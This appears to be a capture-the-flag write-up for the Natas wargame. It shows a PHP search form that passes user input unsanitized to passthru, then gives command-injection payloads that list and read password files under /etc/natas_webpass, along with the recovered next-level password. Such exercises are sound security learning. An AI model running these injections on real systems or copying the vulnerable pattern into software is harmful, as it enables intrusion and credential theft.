```html
<form>
Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
</form>


Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

Exploit the use of unsanitized [`passthru`](https://www.php.net/manual/en/function.passthru.php):

`; find /etc/ natas10; echo`
```
...
/etc/natas_webpass/natas29
/etc/natas_webpass/natas10
/etc/natas_webpass/natas16
...
dictionary.txt
```

`; cat /etc/natas_webpass/natas10; echo`
```
t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
dictionary.txt
```
